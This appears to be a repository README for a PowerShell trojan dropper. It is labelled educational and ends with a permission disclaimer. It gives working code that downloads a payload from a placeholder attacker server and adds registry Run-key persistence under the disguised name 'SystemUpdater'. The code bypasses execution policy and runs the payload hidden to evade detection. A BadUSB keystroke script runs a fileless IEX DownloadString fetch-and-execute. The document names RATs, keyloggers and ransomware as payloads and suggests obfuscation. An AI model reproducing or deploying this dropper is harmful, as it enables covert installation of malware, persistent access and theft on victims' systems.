# pwsh-payload-dropper

This repository contains a PowerShell script that demonstrates the functionality of a trojan dropper. A trojan dropper is a type of malware that downloads and installs malicious payloads onto a target system. 
## This script is intended for educational purposes only.

The script performs the following actions:

**Downloads a Payload:**

The script downloads a file (referred to as the "payload") from a remote URL specified in the $payloadURL variable.

The payload is saved to a specific location on the target machine, typically in the Public directory ($env:PUBLIC\update.ps1).

**Adds Persistence:**

The script adds a registry entry to the HKCU:\Software\Microsoft\Windows\CurrentVersion\Run path.

**Executes the Payload:**

The script sets the PowerShell execution policy to Bypass for the current process, allowing the payload to run without restrictions.

It then executes the downloaded payload (update.ps1) in a hidden window to avoid detection.

**The payload could be any malicious script or executable, such as:**

A remote access trojan (RAT) for unauthorized remote control.

A keylogger to capture sensitive information.

Ransomware to encrypt files and demand payment.

A cryptocurrency miner to exploit system resources.

## This script and the payload can both be obfuscated for further evasion. 
```
$filePath = "$env:PUBLIC\update.ps1" # This must be current with the payload type .exe,.py,.sh,.ps1 | in my testing I used a pwsh reverse shell, hence update.ps1
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemUpdater"
$payloadURL = "<YOUR_HOSTING_SERVER>/<YOUR_PAYLOAD>"

# Download the payload | you can also choose to obfuscate the payload first
Invoke-WebRequest -Uri $payloadURL -OutFile $filePath

# Add persistence to registry
Set-ItemProperty -Path $regPath -Name $regName -Value $filePath

# Set execution policy to bypass for the current process
Set-ExecutionPolicy Bypass -Scope Process -Force

# Execute the update.ps1 script
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$filePath`""
```
## You can also run this as a badusbscript fileless malware attack

just be sure to include this in your badusb script before running
```
STRING Set-ExecutionPolicy Bypass -Scope Process -Force
ENTER
DELAY 1000
STRING powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "IEX (New-Object Net.WebClient).DownloadString('<http//your_server_ip:port>/<PAYLOAD_FILE>')"
ENTER
DELAY 1000
STRING exit
ENTER
```
# Disclaimer
This script is provided for educational and research purposes only. I do not condone or support the use of this script for malicious activities. Always ensure you have explicit permission before testing or deploying any script on a system.
